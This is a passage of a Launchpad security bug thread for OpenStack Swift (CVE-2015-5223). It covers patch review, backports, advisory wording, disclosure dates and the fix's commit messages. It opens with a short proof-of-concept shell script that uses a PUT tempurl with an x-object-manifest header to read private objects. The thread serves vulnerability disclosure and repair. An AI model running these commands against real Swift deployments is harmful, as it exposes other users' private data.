swift post -H 'x-account-meta-temp-url-key: mykey'
# create a container for people to upload stuff too
swift post public
# attacker: "yes hello, can I have a safe place to upload some of my data?"
PUT\_TEMPURL\_SIG="$(swift tempurl PUT 60 /v1/AUTH\_test/public/your-thing mykey)"
curl -XPUT -H 'x-object-manifest: private/secret' "http://localhost:8080${PUT\_TEMPURL\_SIG}" -d ''
# attacker: "oh yes, that data I just uploaded - can I download it please?"
PUT\_TEMPURL\_SIG="$(swift tempurl GET 60 /v1/AUTH\_test/public/your-thing mykey)"
# attacker: only... it's not \*MY\* data - trolrolrololollolo
echo ""
echo "\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*"
curl "http://localhost:8080${PUT\_TEMPURL\_SIG}"
echo ""
echo "\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*"

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Robert Clark (robert-clark)](https://launchpad.net/~robert-clark) wrote on 2015-07-06: |  |  | [#8](/swift/%2Bbug/1453948/comments/8) |
| --- | --- | --- | --- |

Looks like class A to me, not overly complicated to exploit given the right situation...

Looks like class A to me, not overly complicated to exploit given the right situation...

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-07-22: |  |  | [#9](/swift/%2Bbug/1453948/comments/9) |
| --- | --- | --- | --- |

Clay, the patch looks fine except that I can't make the functests fail with patched or unpatched server code. I'm always getting a 201 for the object PUTs.

Clay, the patch looks fine except that I can't make the functests fail with patched or unpatched server code. I'm always getting a 201 for the object PUTs.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-07-22: |  |  | [#10](/swift/%2Bbug/1453948/comments/10) |
| --- | --- | --- | --- |

ah I think I forgot some else: self.fail('request did not error') sorta lines in there - nice catch! #willfix

ah I think I forgot some else: self.fail('request did not error') sorta lines in there - nice catch! #willfix

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Kota Tsuyuzaki (tsuyuzaki-kota)](https://launchpad.net/~tsuyuzaki-kota) wrote on 2015-07-24: |  |  | [#11](/swift/%2Bbug/1453948/comments/11) |
| --- | --- | --- | --- |

* [fix-tempurl-for-clayg.diff](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4433373/%2Bfiles/fix-tempurl-for-clayg.diff)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4433373)
  (7.3 KiB,
  text/plain)

@Clay

Here for you adding the self.fail to functional if manifest file upload succeeded.

Code looks good but just a question from me. Is this bug already defined as class A? If so, no problem to merge attached patch I guess.

However, if classified as B or so, I am wondering if we could take another option (or not? I'm not sure) that we can add 'x-object-manifest' to incoming\_remove\_headers at tempurl config as default. The way I'm now suggesting here allows to put object with 'x-object-manifest' header (will succeed as 201) but actually Swift will store the empty object w/o the header. The reason I talk about this is that currently Swift doesn't block similar uploading case for \*SLO\*. Note that SLO doesn't have security issue like this for now because tempurl PUT seems to drop "multipart-manifest=put" query. Therefore "blocking as 400" vs "Allowing to store but modified silently like SLO".

@Clay
Here for you adding the self.fail to functional if manifest file upload succeeded.
Code looks good but just a question from me. Is this bug already defined as class A? If so, no problem to merge attached patch I guess.
However, if classified as B or so, I am wondering if we could take another option (or not? I'm not sure) that we can add 'x-object-manifest' to incoming\_remove\_headers at tempurl config as default. The way I'm now suggesting here allows to put object with 'x-object-manifest' header (will succeed as 201) but actually Swift will store the empty object w/o the header. The reason I talk about this is that currently Swift doesn't block similar uploading case for \*SLO\*. Note that SLO doesn't have security issue like this for now because tempurl PUT seems to drop "multipart-manifest=put" query. Therefore "blocking as 400" vs "Allowing to store but modified silently like SLO".

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-07-24: |  |  | [#12](/swift/%2Bbug/1453948/comments/12) |
| --- | --- | --- | --- |

* [fix-patch-for-kota.patch](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4433396/%2Bfiles/fix-patch-for-kota.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4433396)
  (7.4 KiB,
  text/plain)

@Kota I want the explicit error because if someone is trying to make a dlo via tempurl they are either

a) trying to validate this security hole and they will know they are patched/hozed by the 400

b) trying to use this vulnerability as a make shift temporary-large-object-upload feature and should be told explicitly that we have broken this workflow because it was not safe and they will need to force us to implement some support for this use case (probably via for tempurl signatures in slo's FWIW).

I retested Kota's patch and I think the only thing that is missing is the Co-Author line ;)

@Kota I want the explicit error because if someone is trying to make a dlo via tempurl they are either
a) trying to validate this security hole and they will know they are patched/hozed by the 400
b) trying to use this vulnerability as a make shift temporary-large-object-upload feature and should be told explicitly that we have broken this workflow because it was not safe and they will need to force us to implement some support for this use case (probably via for tempurl signatures in slo's FWIW).
I retested Kota's patch and I think the only thing that is missing is the Co-Author line ;)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Kota Tsuyuzaki (tsuyuzaki-kota)](https://launchpad.net/~tsuyuzaki-kota) wrote on 2015-07-24: |  |  | [#13](/swift/%2Bbug/1453948/comments/13) |
| --- | --- | --- | --- |

@Clay That totally makes me sense and I agreed we should show the error explicitly. And thanks for adding me to the co-author line :)

@Clay That totally makes me sense and I agreed we should show the error explicitly. And thanks for adding me to the co-author line :)

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-07-27: |  |  | [#14](/swift/%2Bbug/1453948/comments/14) |
| --- | --- | --- | --- |

@Clay, the patch in #12 looks good.

Consider this my +2, which gives us 2 (from Kota's in #13).

We'll need to get backports here, and it looks like we don't have a CVE description yet. I'm not sure what the next step is there.

@Clay, the patch in #12 looks good.
Consider this my +2, which gives us 2 (from Kota's in #13).
We'll need to get backports here, and it looks like we don't have a CVE description yet. I'm not sure what the next step is there.

| **description**: | updated |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-07-29: |  |  | [#15](/swift/%2Bbug/1453948/comments/15) |
| --- | --- | --- | --- |

* [tempurl.patch](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4435635/%2Bfiles/tempurl.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4435635)
  (7.6 KiB,
  text/plain)

attached is the exact same patch (including commit message, date, and author) except formatted with `git format-patch` so that `git am <file.patch` will apply it cleanly.

I am working on backport patches for juno and kilo, but I still have a few unit test errors there.

attached is the exact same patch (including commit message, date, and author) except formatted with `git format-patch` so that `git am <file.patch` will apply it cleanly.
I am working on backport patches for juno and kilo, but I still have a few unit test errors there.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-07-29: |  |  | [#16](/swift/%2Bbug/1453948/comments/16) |
| --- | --- | --- | --- |

* [juno-tempurl-bp.patch](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4435840/%2Bfiles/juno-tempurl-bp.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4435840)
  (7.6 KiB,
  text/plain)

backport for juno. This is based off of the proposed juno backport in <https://review.openstack.org/#/q/Id179513c6010d827cbcbdda7692a920e29213bcb,n,z>

backport for juno. This is based off of the proposed juno backport in https://review.openstack.org/#/q/Id179513c6010d827cbcbdda7692a920e29213bcb,n,z

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-07-29: |  |  | [#17](/swift/%2Bbug/1453948/comments/17) |
| --- | --- | --- | --- |

* [kilo-tempurl-bp.patch](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4435842/%2Bfiles/kilo-tempurl-bp.patch)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4435842)
  (7.6 KiB,
  text/plain)

backport for kilo. This is based off of the proposed juno backport in <https://review.openstack.org/#/q/Id179513c6010d827cbcbdda7692a920e29213bcb,n,z>

backport for kilo. This is based off of the proposed juno backport in https://review.openstack.org/#/q/Id179513c6010d827cbcbdda7692a920e29213bcb,n,z

| Changed in swift: | |
| --- | --- |
| **importance**: | Undecided → Critical |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-08-04: |  |  | [#18](/swift/%2Bbug/1453948/comments/18) |
| --- | --- | --- | --- |

@notmyname, would it makes sense to solve both [bug 1453948](/bugs/1453948) and [bug 1449212](/bugs/1449212) with a single OSSA/CVE ? If so, would that updated impact description good enough to cover both cases ?

Title: Information leak via Swift tempurls

Reporter: Richard Hawkins (Rackspace)

Products: Swift

Affects: versions through 2.2.0, and 2.2.1 versions through 2.3.0

Description:

Richard Hawkins from Rackspace reported a vulnerability in Swift tempurls. When in possession of a tempurl key for a Swift container, a malicious actor may retrieve objects within any other containers for the same Swift account (tenant). All Swift setup are affected.

@notmyname, would it makes sense to solve both bug 1453948 and bug 1449212 with a single OSSA/CVE ? If so, would that updated impact description good enough to cover both cases ?
Title: Information leak via Swift tempurls
Reporter: Richard Hawkins (Rackspace)
Products: Swift
Affects: versions through 2.2.0, and 2.2.1 versions through 2.3.0
Description:
Richard Hawkins from Rackspace reported a vulnerability in Swift tempurls. When in possession of a tempurl key for a Swift container, a malicious actor may retrieve objects within any other containers for the same Swift account (tenant). All Swift setup are affected.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-05: |  |  | [#19](/swift/%2Bbug/1453948/comments/19) |
| --- | --- | --- | --- |

* [anc-tempurl-dlo-POST-regression](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4439702/%2Bfiles/anc-tempurl-dlo-POST-regression)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4439702)
  (3.2 KiB,
  text/plain)

I'm +2 for the patch in #15

The tests do not cover POST requests. The fix does so there is no vulnerability with a POST but I think it would be worth adding a test to prevent a regression of the kind illustrated in the attached diff (diff wrt patch from #15). I can propose that to master after this fix is released.

I'm +2 for the patch in #15
The tests do not cover POST requests. The fix does so there is no vulnerability with a POST but I think it would be worth adding a test to prevent a regression of the kind illustrated in the attached diff (diff wrt patch from #15). I can propose that to master after this fix is released.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-05: |  |  | [#20](/swift/%2Bbug/1453948/comments/20) |
| --- | --- | --- | --- |

* [anc-tempurl-dlo-POST-test](https://bugs.launchpad.net/swift/%2Bbug/1453948/%2Battachment/4439705/%2Bfiles/anc-tempurl-dlo-POST-test)
  [Edit](/swift/%2Bbug/1453948/%2Battachment/4439705)
  (4.1 KiB,
  text/plain)

FWIW Here's a suggested diff wrt patch at #15 for extra test coverage of POSTs. But I repeat I am +2 for merging patch at #15 as it is and following up with the extra tests.

FWIW Here's a suggested diff wrt patch at #15 for extra test coverage of POSTs. But I repeat I am +2 for merging patch at #15 as it is and following up with the extra tests.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-08-10: |  |  | [#21](/swift/%2Bbug/1453948/comments/21) |
| --- | --- | --- | --- |

Updated report description:

Title: Information leak via Swift tempurls

Reporter: Richard Hawkins and Swift core reviewers

Products: Swift

Affects: versions through 2.3.0

Description:

Richard Hawkins and Swift core reviewers reported a vulnerability in Swift tempurls. When in possession of a tempurl key authorized for PUT, a malicious actor may retrieve other objects in the same Swift account (tenant). All Swift setup are affected.

Updated report description:
Title: Information leak via Swift tempurls
Reporter: Richard Hawkins and Swift core reviewers
Products: Swift
Affects: versions through 2.3.0
Description:
Richard Hawkins and Swift core reviewers reported a vulnerability in Swift tempurls. When in possession of a tempurl key authorized for PUT, a malicious actor may retrieve other objects in the same Swift account (tenant). All Swift setup are affected.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-08-17: |  |  | [#22](/swift/%2Bbug/1453948/comments/22) |
| --- | --- | --- | --- |

Thanks John.

Adding affiliation back to description:

Title: Information leak via Swift tempurls

Reporter: Richard Hawkins (Rackspace) and Swift core reviewers

Products: Swift

Affects: versions through 2.3.0

Description:

Richard Hawkins from Rackspace and Swift core reviewers reported a vulnerability in Swift tempurls. When in possession of a tempurl key authorized for PUT, a malicious actor may retrieve other objects in the same Swift account (tenant). All Swift setup are affected.

Thanks John.
Adding affiliation back to description:
Title: Information leak via Swift tempurls
Reporter: Richard Hawkins (Rackspace) and Swift core reviewers
Products: Swift
Affects: versions through 2.3.0
Description:
Richard Hawkins from Rackspace and Swift core reviewers reported a vulnerability in Swift tempurls. When in possession of a tempurl key authorized for PUT, a malicious actor may retrieve other objects in the same Swift account (tenant). All Swift setup are affected.

| Changed in ossa: | |
| --- | --- |
| **status**: | Incomplete → Triaged |
| **assignee**: | nobody → Tristan Cacqueray (tristan-cacqueray) |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-08-19: |  |  | [#23](/swift/%2Bbug/1453948/comments/23) |
| --- | --- | --- | --- |

As for the required patchs to fix the bug describe above:

master/liberty: [bug 1453948](/bugs/1453948) comment #15, [bug 1449212](/bugs/1449212) comment #85

stable/kilo: [bug 1453948](/bugs/1453948) comment #17, [bug 1449212](/bugs/1449212) comment #90

stable/juno: [bug 1453948](/bugs/1453948) comment #16

Seems like all the patch have now been pre-approved. Should we requests a CVE with description in comment #22 and set this disclosure date:

2015-08-25, 1500UTC

As for the required patchs to fix the bug describe above:
master/liberty: bug 1453948 comment #15, bug 1449212 comment #85
stable/kilo: bug 1453948 comment #17, bug 1449212 comment #90
stable/juno: bug 1453948 comment #16
Seems like all the patch have now been pre-approved. Should we requests a CVE with description in comment #22 and set this disclosure date:
2015-08-25, 1500UTC

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-08-19: |  |  | [#24](/swift/%2Bbug/1453948/comments/24) |
| --- | --- | --- | --- |

The impact description in comment #22 looks fine, though I'd say "all Swift setups" rather than "all Swift setup" (minor grammar nit).

I'm good with the proposed Tuesday, August 25 disclosure, since that gives ample time for us to notify downstream stakeholders. As a reminder, this is intended to cover bugs 1453948 and 1449212.

The impact description in comment #22 looks fine, though I'd say "all Swift setups" rather than "all Swift setup" (minor grammar nit).
I'm good with the proposed Tuesday, August 25 disclosure, since that gives ample time for us to notify downstream stakeholders. As a reminder, this is intended to cover bugs 1453948 and 1449212.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-08-19: |  |  | [#25](/swift/%2Bbug/1453948/comments/25) |
| --- | --- | --- | --- |

looks good

looks good

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-08-19

| Changed in ossa: | |
| --- | --- |
| **status**: | Triaged → In Progress |

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-08-19

| **summary**: | - all PUT tempurls leak existence via DLO manifest attack+ all PUT tempurls leak existence via DLO manifest attack (CVE-2015-5223) |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-08-20:  [**Re: all PUT tempurls leak existence via DLO manifest attack (CVE-2015-5223)**](/swift/%2Bbug/1453948/comments/26) |  |  | [#26](/swift/%2Bbug/1453948/comments/26) |
| --- | --- | --- | --- |

Disclosure date (extended by one day):

2015-08-26, 1500UTC

Disclosure date (extended by one day):
2015-08-26, 1500UTC

| Changed in ossa: | |
| --- | --- |
| **status**: | In Progress → Fix Committed |

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-08-26

| **information type**: | Private Security → Public Security |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-08-26:  [**Fix proposed to swift (stable/kilo)**](/swift/%2Bbug/1453948/comments/27) |  |  | [#27](/swift/%2Bbug/1453948/comments/27) |
| --- | --- | --- | --- |

Fix proposed to branch: stable/kilo

Review: <https://review.openstack.org/217254>

Fix proposed to branch: stable/kilo
Review: https://review.openstack.org/217254

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-08-26:  [**Related fix proposed to swift (master)**](/swift/%2Bbug/1453948/comments/28) |  |  | [#28](/swift/%2Bbug/1453948/comments/28) |
| --- | --- | --- | --- |

Related fix proposed to branch: master

Review: <https://review.openstack.org/217273>

Related fix proposed to branch: master
Review: https://review.openstack.org/217273

[Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray)
on 2015-08-26

| **summary**: | - all PUT tempurls leak existence via DLO manifest attack (CVE-2015-5223)+ [OSSA 2015-016] all PUT tempurls leak existence via DLO manifest attack+ (CVE-2015-5223) |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-08-27:  [**Fix merged to swift (stable/juno)**](/swift/%2Bbug/1453948/comments/29) |  |  | [#29](/swift/%2Bbug/1453948/comments/29) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/217253>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=0694e1911d10a18075ff99462c96781372422b2c>

Submitter: Jenkins

Branch: stable/juno

commit 0694e1911d10a18075ff99462c96781372422b2c

Author: Clay Gerrard <email address hidden>

Date: Thu Jul 23 22:36:21 2015 -0700

Disallow unsafe tempurl operations to point to unauthorized data

Do not allow PUT tempurls to create pointers to other data. Specifically

    disallow the creation of DLO object manifests by returning an error if a

    non-safe tempurl request includes an X-Object-Manifest header regardless of

    the value of the header.

This prevents discoverability attacks which can use any PUT tempurl to probe

    for private data by creating a DLO object manifest and then using the PUT

    tempurl to head the object which would 404 if the prefix does not match any

    object data or form a valid DLO HEAD response if it does.

This also prevents a tricky and potentially unexpected consequence of PUT

    tempurls which would make it unsafe to allow a user to download objects

    created by tempurl (even if they just created them) because the result of

    reading the object created via tempurl may not be the data which was uploaded.

[CVE-2015-5223]

Co-Authored-By: Kota Tsuyuzaki <email address hidden>

Closes-Bug: 1453948

Change-Id: I91161dfb0f089c3990aca1b4255b520299ef73c8

Reviewed: https://review.openstack.org/217253
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=0694e1911d10a18075ff99462c96781372422b2c
Submitter: Jenkins
Branch: stable/juno
commit 0694e1911d10a18075ff99462c96781372422b2c
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 22:36:21 2015 -0700
Disallow unsafe tempurl operations to point to unauthorized data
Do not allow PUT tempurls to create pointers to other data. Specifically
disallow the creation of DLO object manifests by returning an error if a
non-safe tempurl request includes an X-Object-Manifest header regardless of
the value of the header.
This prevents discoverability attacks which can use any PUT tempurl to probe
for private data by creating a DLO object manifest and then using the PUT
tempurl to head the object which would 404 if the prefix does not match any
object data or form a valid DLO HEAD response if it does.
This also prevents a tricky and potentially unexpected consequence of PUT
tempurls which would make it unsafe to allow a user to download objects
created by tempurl (even if they just created them) because the result of
reading the object created via tempurl may not be the data which was uploaded.
[CVE-2015-5223]
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Closes-Bug: 1453948
Change-Id: I91161dfb0f089c3990aca1b4255b520299ef73c8

| **tags**: | added: in-stable-juno |
| --- | --- |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-08-27:  [**Fix merged to swift (master)**](/swift/%2Bbug/1453948/comments/30) |  |  | [#30](/swift/%2Bbug/1453948/comments/30) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/217259>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=10b2939b433a4a79b4f7b97640b3d208cacfeffb>

Submitter: Jenkins

Branch: master

commit 10b2939b433a4a79b4f7b97640b3d208cacfeffb

Author: Clay Gerrard <email address hidden>

Date: Thu Jul 23 22:36:21 2015 -0700

Disallow unsafe tempurl operations to point to unauthorized data

Do not allow PUT tempurls to create pointers to other data. Specifically

    disallow the creation of DLO object manifests by returning an error if a

    non-safe tempurl request includes an X-Object-Manifest header regardless of

    the value of the header.

This prevents discoverability attacks which can use any PUT tempurl to probe

    for private data by creating a DLO object manifest and then using the PUT

    tempurl to head the object which would 404 if the prefix does not match any

    object data or form a valid DLO HEAD response if it does.

This also prevents a tricky and potentially unexpected consequence of PUT

    tempurls which would make it unsafe to allow a user to download objects

    created by tempurl (even if they just created them) because the result of

    reading the object created via tempurl may not be the data which was uploaded.

[CVE-2015-5223]

Co-Authored-By: Kota Tsuyuzaki <email address hidden>

Change-Id: I11e68830009d3f6bff44ae4011a41b67139146f6

    Closes-Bug: 1453948

Reviewed: https://review.openstack.org/217259
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=10b2939b433a4a79b4f7b97640b3d208cacfeffb
Submitter: Jenkins
Branch: master
commit 10b2939b433a4a79b4f7b97640b3d208cacfeffb
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 22:36:21 2015 -0700
Disallow unsafe tempurl operations to point to unauthorized data
Do not allow PUT tempurls to create pointers to other data. Specifically
disallow the creation of DLO object manifests by returning an error if a
non-safe tempurl request includes an X-Object-Manifest header regardless of
the value of the header.
This prevents discoverability attacks which can use any PUT tempurl to probe
for private data by creating a DLO object manifest and then using the PUT
tempurl to head the object which would 404 if the prefix does not match any
object data or form a valid DLO HEAD response if it does.
This also prevents a tricky and potentially unexpected consequence of PUT
tempurls which would make it unsafe to allow a user to download objects
created by tempurl (even if they just created them) because the result of
reading the object created via tempurl may not be the data which was uploaded.
[CVE-2015-5223]
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Change-Id: I11e68830009d3f6bff44ae4011a41b67139146f6
Closes-Bug: 1453948

| Changed in swift: | |
| --- | --- |
| **status**: | Confirmed → Fix Committed |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-08-27:  [**Fix merged to swift (stable/kilo)**](/swift/%2Bbug/1453948/comments/31) |  |  | [#31](/swift/%2Bbug/1453948/comments/31) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/217254>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=410778b86a49702f80b734bdbf2480b86db342e2>

Submitter: Jenkins

Branch: stable/kilo

commit 410778b86a49702f80b734bdbf2480b86db342e2

Author: Clay Gerrard <email address hidden>

Date: Thu Jul 23 22:36:21 2015 -0700

Disallow unsafe tempurl operations to point to unauthorized data

Do not allow PUT tempurls to create pointers to other data. Specifically

    disallow the creation of DLO object manifests by returning an error if a

    non-safe tempurl request includes an X-Object-Manifest header regardless of

    the value of the header.

This prevents discoverability attacks which can use any PUT tempurl to probe

    for private data by creating a DLO object manifest and then using the PUT

    tempurl to head the object which would 404 if the prefix does not match any

    object data or form a valid DLO HEAD response if it does.

This also prevents a tricky and potentially unexpected consequence of PUT

    tempurls which would make it unsafe to allow a user to download objects

    created by tempurl (even if they just created them) because the result of

    reading the object created via tempurl may not be the data which was uploaded.

[CVE-2015-5223]

Co-Authored-By: Kota Tsuyuzaki <email address hidden>

Closes-Bug: 1453948

Change-Id: I91161dfb0f089c3990aca1b4255b520299ef73c8

Reviewed: https://review.openstack.org/217254
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=410778b86a49702f80b734bdbf2480b86db342e2
Submitter: Jenkins
Branch: stable/kilo
commit 410778b86a49702f80b734bdbf2480b86db342e2
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 22:36:21 2015 -0700
Disallow unsafe tempurl operations to point to unauthorized data
Do not allow PUT tempurls to create pointers to other data. Specifically
disallow the creation of DLO object manifests by returning an error if a
non-safe tempurl request includes an X-Object-Manifest header regardless of
the value of the header.
This prevents discoverability attacks which can use any PUT tempurl to probe
for private data by creating a DLO object manifest and then using the PUT
tempurl to head the object which would 404 if the prefix does not match any
object data or form a valid DLO HEAD response if it does.
This also prevents a tricky and potentially unexpected consequence of PUT
tempurls which would make it unsafe to allow a user to download objects
created by tempurl (even if they just created them) because the result of
reading the object created via tempurl may not be the data which was uploaded.
[CVE-2015-5223]
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Closes-Bug: 1453948
Change-Id: I91161dfb0f089c3990aca1b4255b520299ef73c8

| **tags**: | added: in-stable-kilo |
| --- | --- |

[Thierry Carrez (ttx)](https://launchpad.net/~ttx)
on 2015-09-01

| Changed in swift: | |
| --- | --- |
| **milestone**: | none → 2.4.0 |
| **status**: | Fix Committed → Fix Released |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-02:  [**Fix proposed to swift (feature/crypto)**](/swift/%2Bbug/1453948/comments/32) |  |  | [#32](/swift/%2Bbug/1453948/comments/32) |
| --- | --- | --- | --- |

Fix proposed to branch: feature/crypto

Review: <https://review.openstack.org/219775>

Fix proposed to branch: feature/crypto
Review: https://review.openstack.org/219775

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-03:  [**Related fix merged to swift (master)**](/swift/%2Bbug/1453948/comments/33) |  |  | [#33](/swift/%2Bbug/1453948/comments/33) |
| --- | --- | --- | --- |

Reviewed: <https://review.openstack.org/217273>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52>

Submitter: Jenkins

Branch: master

commit 58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52

Author: Alistair Coles <email address hidden>

Date: Wed Aug 26 16:30:23 2015 +0100

Add test that a tempurl POST cannot set a DLO manifest header

Follow up to [1] to add tests for tempurl POSTs not being allowed

    to set a DLO manifest header.

[1] I11e68830009d3f6bff44ae4011a41b67139146f6

Change-Id: I7c0ad5a936f71e56c599b8495a586913d3334422

    Related-Bug: 1453948

Reviewed: https://review.openstack.org/217273
Committed: https://git.openstack.org/cgit/openstack/swift/commit/?id=58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52
Submitter: Jenkins
Branch: master
commit 58a10a5fffec69304d7bcce0f1c43bd2a9f9ff52
Author: Alistair Coles <alistair.coles@hp.com>
Date: Wed Aug 26 16:30:23 2015 +0100
Add test that a tempurl POST cannot set a DLO manifest header
Follow up to [1] to add tests for tempurl POSTs not being allowed
to set a DLO manifest header.
[1] I11e68830009d3f6bff44ae4011a41b67139146f6
Change-Id: I7c0ad5a936f71e56c599b8495a586913d3334422
Related-Bug: 1453948

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [OpenStack Infra (hudson-openstack)](https://launchpad.net/~hudson-openstack) wrote on 2015-09-03:  [**Fix merged to swift (feature/crypto)**](/swift/%2Bbug/1453948/comments/34) |  |  | [#34](/swift/%2Bbug/1453948/comments/34) |
| --- | --- | --- | --- |

[Download full text](https://bugs.launchpad.net/swift/%2Bbug/1453948/comments/34/%2Bdownload) (43.3 KiB)

Reviewed: <https://review.openstack.org/219775>

Committed: <https://git.openstack.org/cgit/openstack/swift/commit/?id=257e468e9bfd1088040419ad408106ac3c77b531>

Submitter: Jenkins

Branch: feature/crypto

commit e02609c66a804845672413b06830b87395afef31

Author: Samuel Merritt <email address hidden>

Date: Tue Sep 1 15:19:50 2015 -0700

Preserve traceback in swift-dispersion-report

Commit c690bcb fixed a bug in the dispersion report, but changed this

    from a bare "raise" to "raise err", which loses the traceback. Not a

    big deal, but worth putting back IMO.

Change-Id: Id5b72153a4b8df8e3faaf1fa3fb2040e28ba85cc

commit d06d4ad0fd2dfe69da8008e729651264522c6c06

Author: Minwoo Bae <email address hidden>

Date: Tue Sep 1 15:08:44 2015 -0500

Included reference in swift.obj.diskfile to enumerate the string

    used for data file paths.

Change-Id: Ie22caa678bc00dfc43fabec7efbbb9f34490f1b5

commit 524c89b7eeff037b8a6b421888771e15f98c2da2

Author: John Dickinson <email address hidden>

Date: Fri Aug 21 13:39:41 2015 -0700

